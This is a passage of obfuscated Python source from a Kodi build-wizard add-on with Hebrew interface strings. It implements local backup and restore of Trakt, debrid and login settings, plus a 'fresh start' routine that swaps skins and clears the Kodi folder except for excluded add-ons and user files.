	OOOO000000O0OO000 =os .path .join (ADDONS ,O00OOOO0O00O00O0O ,'addon.xml')#line:4463
	if os .path .exists (OOOO000000O0OO000 ):#line:4464
		O000OOOOOOO00OO00 =open (OOOO000000O0OO000 ,mode ='r');O000O000O0O0O00O0 =O000OOOOOOO00OO00 .read ();O000OOOOOOO00OO00 .close ();#line:4465
		O0000OO000O00OOO0 =wiz .parseDOM (O000O000O0O0O00O0 ,'import',ret ='addon')#line:4466
		OOOO0O00OOOOO000O =[]#line:4467
		for OOOOO00OOO000O000 in O0000OO000O00OOO0 :#line:4468
			if not 'xbmc.python'in OOOOO00OOO000O000 :#line:4469
				OOOO0O00OOOOO000O .append (OOOOO00OOO000O000 )#line:4470
		return OOOO0O00OOOOO000O #line:4471
	return []#line:4472
def manageSaveData (O0OOOO0O000000000 ):#line:4474
	if O0OOOO0O000000000 =='import':#line:4475
		OOOOOOOO0O0OOO0O0 =os .path .join (ADDONDATA ,'temp')#line:4476
		if not os .path .exists (OOOOOOOO0O0OOO0O0 ):os .makedirs (OOOOOOOO0O0OOO0O0 )#line:4477
		O0O0O0O00OO00OOO0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4478
		if not O0O0O0O00OO00OOO0 .endswith ('.zip'):#line:4479
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4480
			return #line:4481
		O0O0O00OO0O000O0O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4482
		OOO00OOO00O0OO0O0 =xbmcvfs .copy (O0O0O0O00OO00OOO0 ,O0O0O00OO0O000O0O )#line:4483
		wiz .log ("%s"%str (OOO00OOO00O0OO0O0 ))#line:4484
		extract .all (xbmc .translatePath (O0O0O00OO0O000O0O ),OOOOOOOO0O0OOO0O0 )#line:4485
		OO000OOOO00000O0O =os .path .join (OOOOOOOO0O0OOO0O0 ,'trakt')#line:4486
		O0O000OO0OOO0O00O =os .path .join (OOOOOOOO0O0OOO0O0 ,'login')#line:4487
		O00O0O0OOO0OO0000 =os .path .join (OOOOOOOO0O0OOO0O0 ,'debrid')#line:4488
		O0000OOOOO00OO000 =0 #line:4489
		if os .path .exists (OO000OOOO00000O0O ):#line:4490
			O0000OOOOO00OO000 +=1 #line:4491
			OOO0OOO0O0000O0OO =os .listdir (OO000OOOO00000O0O )#line:4492
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4493
			for O0O000000O00OO0OO in OOO0OOO0O0000O0OO :#line:4494
				OO000OOOO00O000OO =os .path .join (traktit .TRAKTFOLD ,O0O000000O00OO0OO )#line:4495
				O000OOO0O0000O000 =os .path .join (OO000OOOO00000O0O ,O0O000000O00OO0OO )#line:4496
				if os .path .exists (OO000OOOO00O000OO ):#line:4497
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O000000O00OO0OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4498
					else :os .remove (OO000OOOO00O000OO )#line:4499
				shutil .copy (O000OOO0O0000O000 ,OO000OOOO00O000OO )#line:4500
			traktit .importlist ('all')#line:4501
			traktit .traktIt ('restore','all')#line:4502
		if os .path .exists (O0O000OO0OOO0O00O ):#line:4503
			O0000OOOOO00OO000 +=1 #line:4504
			OOO0OOO0O0000O0OO =os .listdir (O0O000OO0OOO0O00O )#line:4505
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4506
			for O0O000000O00OO0OO in OOO0OOO0O0000O0OO :#line:4507
				OO000OOOO00O000OO =os .path .join (loginit .LOGINFOLD ,O0O000000O00OO0OO )#line:4508
				O000OOO0O0000O000 =os .path .join (O0O000OO0OOO0O00O ,O0O000000O00OO0OO )#line:4509
				if os .path .exists (OO000OOOO00O000OO ):#line:4510
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O000000O00OO0OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4511
					else :os .remove (OO000OOOO00O000OO )#line:4512
				shutil .copy (O000OOO0O0000O000 ,OO000OOOO00O000OO )#line:4513
			loginit .importlist ('all')#line:4514
			loginit .loginIt ('restore','all')#line:4515
		if os .path .exists (O00O0O0OOO0OO0000 ):#line:4516
			O0000OOOOO00OO000 +=1 #line:4517
			OOO0OOO0O0000O0OO =os .listdir (O00O0O0OOO0OO0000 )#line:4518
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4519
			for O0O000000O00OO0OO in OOO0OOO0O0000O0OO :#line:4520
				OO000OOOO00O000OO =os .path .join (debridit .REALFOLD ,O0O000000O00OO0OO )#line:4521
				O000OOO0O0000O000 =os .path .join (O00O0O0OOO0OO0000 ,O0O000000O00OO0OO )#line:4522
				if os .path .exists (OO000OOOO00O000OO ):#line:4523
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O000000O00OO0OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4524
					else :os .remove (OO000OOOO00O000OO )#line:4525
				shutil .copy (O000OOO0O0000O000 ,OO000OOOO00O000OO )#line:4526
			debridit .importlist ('all')#line:4527
			debridit .debridIt ('restore','all')#line:4528
		wiz .cleanHouse (OOOOOOOO0O0OOO0O0 )#line:4529
		wiz .removeFolder (OOOOOOOO0O0OOO0O0 )#line:4530
		os .remove (O0O0O00OO0O000O0O )#line:4531
		if O0000OOOOO00OO000 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4532
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4533
	elif O0OOOO0O000000000 =='export':#line:4534
		OOOO0O0OO0O00O0O0 =xbmc .translatePath (MYBUILDS )#line:4535
		O0000000OOOOOO00O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4536
		traktit .traktIt ('update','all')#line:4537
		loginit .loginIt ('update','all')#line:4538
		debridit .debridIt ('update','all')#line:4539
		O0O0O0O00OO00OOO0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4540
		O0O0O0O00OO00OOO0 =xbmc .translatePath (O0O0O0O00OO00OOO0 )#line:4541
		O000O0OOO0O0O000O =os .path .join (OOOO0O0OO0O00O0O0 ,'SaveData.zip')#line:4542
		OOOO0OOOO0O0O00OO =zipfile .ZipFile (O000O0OOO0O0O000O ,mode ='w')#line:4543
		for O000O00OOOOOO00OO in O0000000OOOOOO00O :#line:4544
			if os .path .exists (O000O00OOOOOO00OO ):#line:4545
				OOO0OOO0O0000O0OO =os .listdir (O000O00OOOOOO00OO )#line:4546
				for O00O00O00O00O000O in OOO0OOO0O0000O0OO :#line:4547
					OOOO0OOOO0O0O00OO .write (os .path .join (O000O00OOOOOO00OO ,O00O00O00O00O000O ),os .path .join (O000O00OOOOOO00OO ,O00O00O00O00O000O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4548
		OOOO0OOOO0O0O00OO .close ()#line:4549
		if O0O0O0O00OO00OOO0 ==OOOO0O0OO0O00O0O0 :#line:4550
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0OOO0O0O000O ))#line:4551
		else :#line:4552
			try :#line:4553
				xbmcvfs .copy (O000O0OOO0O0O000O ,os .path .join (O0O0O0O00OO00OOO0 ,'SaveData.zip'))#line:4554
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0O0O0O00OO00OOO0 ,'SaveData.zip')))#line:4555
			except :#line:4556
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0OOO0O0O000O ))#line:4557
def freshStart (install =None ,over =False ):#line:4562
	if USERNAME =='':#line:4563
		ADDON .openSettings ()#line:4564
		sys .exit ()#line:4565
	O000OOOOO0O0000OO =u_list (SPEEDFILE )#line:4566
	(O000OOOOO0O0000OO )#line:4567
	O00O0OO0O000O0OO0 =(wiz .workingURL (O000OOOOO0O0000OO ))#line:4568
	(O00O0OO0O000O0OO0 )#line:4569
	if KEEPTRAKT =='true':#line:4570
		traktit .autoUpdate ('all')#line:4571
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4572
	if KEEPREAL =='true':#line:4573
		debridit .autoUpdate ('all')#line:4574
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4575
	if KEEPLOGIN =='true':#line:4576
		loginit .autoUpdate ('all')#line:4577
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4578
	if over ==True :OOO0000OOOOOO0OO0 =1 #line:4579
	elif install =='restore':OOO0000OOOOOO0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4580
	elif install :OOO0000OOOOOO0OO0 =1 #line:4581
	else :OOO0000OOOOOO0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4582
	if OOO0000OOOOOO0OO0 :#line:4583
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4584
			O000000O000O00O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4585
			skinSwitch .swapSkins (O000000O000O00O00 )#line:4588
			O0O00OOO0OOOO0OO0 =0 #line:4589
			xbmc .sleep (1000 )#line:4590
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00OOO0OOOO0OO0 <150 :#line:4591
				O0O00OOO0OOOO0OO0 +=1 #line:4592
				xbmc .sleep (1000 )#line:4593
				wiz .ebi ('SendAction(Select)')#line:4594
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4595
				wiz .ebi ('SendClick(11)')#line:4596
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4597
			xbmc .sleep (1000 )#line:4598
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4599
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4600
			return #line:4601
		wiz .addonUpdates ('set')#line:4602
		OOO0OOOO00O0O0OOO =os .path .abspath (HOME )#line:4603
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4604
		OO0O0OOOO0000O0O0 =sum ([len (OOOO0O000O00OOOO0 )for OO0O0O000O0O0OO0O ,OOOOOOOOO0OO0O000 ,OOOO0O000O00OOOO0 in os .walk (OOO0OOOO00O0O0OOO )]);OO00000O000O000OO =0 #line:4605
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4606
		EXCLUDES .append ('My_Builds')#line:4607
		EXCLUDES .append ('archive_cache')#line:4608
		EXCLUDES .append ('script.module.requests')#line:4609
		EXCLUDES .append ('myfav.anon')#line:4610
		if KEEPREPOS =='true':#line:4611
			OO00OO0OOOO0O000O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4612
			for O0OOO0O0O0O0O00O0 in OO00OO0OOOO0O000O :#line:4613
				O0OOO0OO000OO000O =os .path .split (O0OOO0O0O0O0O00O0 [:-1 ])[1 ]#line:4614
				if not O0OOO0OO000OO000O ==EXCLUDES :#line:4615
					EXCLUDES .append (O0OOO0OO000OO000O )#line:4616
		if KEEPSUPER =='true':#line:4617
			EXCLUDES .append ('plugin.program.super.favourites')#line:4618
		if KEEPMOVIELIST =='true':#line:4619
			EXCLUDES .append ('plugin.video.metalliq')#line:4620
		if KEEPMOVIELIST =='true':#line:4621
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4622
		if KEEPADDONS =='true':#line:4623
			EXCLUDES .append ('addons')#line:4624
		if KEEPADDONS =='true':#line:4625
			EXCLUDES .append ('addon_data')#line:4626
		EXCLUDES .append ('plugin.video.elementum')#line:4629
		EXCLUDES .append ('script.elementum.burst')#line:4630
		EXCLUDES .append ('script.elementum.burst-master')#line:4631
		EXCLUDES .append ('plugin.video.quasar')#line:4632
		EXCLUDES .append ('script.quasar.burst')#line:4633
		EXCLUDES .append ('skin.estuary')#line:4634
		if KEEPWHITELIST =='true':#line:4637
			OOOO0000OOO0O00O0 =''#line:4638
			OOOO00O000O0O00O0 =wiz .whiteList ('read')#line:4639
			if len (OOOO00O000O0O00O0 )>0 :#line:4640
				for O0OOO0O0O0O0O00O0 in OOOO00O000O0O00O0 :#line:4641
					try :OOO0OO00O0O000000 ,OOO00O0O0O0O0000O ,O0OO000O000O00OOO =O0OOO0O0O0O0O00O0 #line:4642
					except :pass #line:4643
					if O0OO000O000O00OOO .startswith ('pvr'):OOOO0000OOO0O00O0 =OOO00O0O0O0O0000O #line:4644
					OOO00OO00OOO0OOOO =dependsList (O0OO000O000O00OOO )#line:4645
					for O0O0OOOOOOO0O0O00 in OOO00OO00OOO0OOOO :#line:4646
						if not O0O0OOOOOOO0O0O00 in EXCLUDES :#line:4647
							EXCLUDES .append (O0O0OOOOOOO0O0O00 )#line:4648
						O00O000O00OO00O0O =dependsList (O0O0OOOOOOO0O0O00 )#line:4649
						for O0000OO00OOOOOO00 in O00O000O00OO00O0O :#line:4650
							if not O0000OO00OOOOOO00 in EXCLUDES :#line:4651
								EXCLUDES .append (O0000OO00OOOOOO00 )#line:4652
					if not O0OO000O000O00OOO in EXCLUDES :#line:4653
						EXCLUDES .append (O0OO000O000O00OOO )#line:4654
				if not OOOO0000OOO0O00O0 =='':wiz .setS ('pvrclient',O0OO000O000O00OOO )#line:4655
		if wiz .getS ('pvrclient')=='':#line:4656
			for O0OOO0O0O0O0O00O0 in EXCLUDES :#line:4657
				if O0OOO0O0O0O0O00O0 .startswith ('pvr'):#line:4658
					wiz .setS ('pvrclient',O0OOO0O0O0O0O00O0 )#line:4659
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4660
		OO000OOOOOO000000 =wiz .latestDB ('Addons')#line:4661
		for O00O0OOO0O0000O0O ,O0O0O0OOOO0OO000O ,OO0O000OO0OO00OOO in os .walk (OOO0OOOO00O0O0OOO ,topdown =True ):#line:4662
			O0O0O0OOOO0OO000O [:]=[O000000OO0OO0OO0O for O000000OO0OO0OO0O in O0O0O0OOOO0OO000O if O000000OO0OO0OO0O not in EXCLUDES ]#line:4663
			for OOO0OO00O0O000000 in OO0O000OO0OO00OOO :#line:4664
				OO00000O000O000OO +=1 #line:4665
				O0OO000O000O00OOO =O00O0OOO0O0000O0O .replace ('/','\\').split ('\\')#line:4666
				O0O00OOO0OOOO0OO0 =len (O0OO000O000O00OOO )-1 #line:4668
				if O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4669
				elif OOO0OO00O0O000000 =='MyVideos99.db'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4670
				elif OOO0OO00O0O000000 =='MyVideos107.db'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4671
				elif OOO0OO00O0O000000 =='MyVideos116.db'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4672
				elif OOO0OO00O0O000000 =='MyVideos99.db'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4673
				elif OOO0OO00O0O000000 =='MyVideos107.db'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4674
				elif OOO0OO00O0O000000 =='MyVideos116.db'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4675
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4676
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4677
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'skin.Premium.mod'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4678
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4679
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'skin.phenomenal'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4680
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4681
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'skin.titan'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4683
				elif O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4684
				elif OOO0OO00O0O000000 =='sources.xml'and O0OO000O000O00OOO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4686
				elif OOO0OO00O0O000000 =='quicknav.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4689
				elif OOO0OO00O0O000000 =='x1101.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4690
				elif OOO0OO00O0O000000 =='b-srtym-b.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4691
				elif OOO0OO00O0O000000 =='x1102.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4692
				elif OOO0OO00O0O000000 =='b-sdrvt-b.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4693
				elif OOO0OO00O0O000000 =='x1112.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4694
				elif OOO0OO00O0O000000 =='b-tlvvyzyh-b.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4695
				elif OOO0OO00O0O000000 =='x1111.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4696
				elif OOO0OO00O0O000000 =='b-tvknyshrly-b.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4697
				elif OOO0OO00O0O000000 =='x1110.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4698
				elif OOO0OO00O0O000000 =='b-yldym-b.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4699
				elif OOO0OO00O0O000000 =='x1114.DATA.xml'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -2 ]=='userdata'and O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO000O000O00OOO [O0O00OOO0OOOO0OO0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O0OOO0O0000O0O ,OOO0OO00O0O000000 ),xbmc .LOGNOTICE )#line:4700
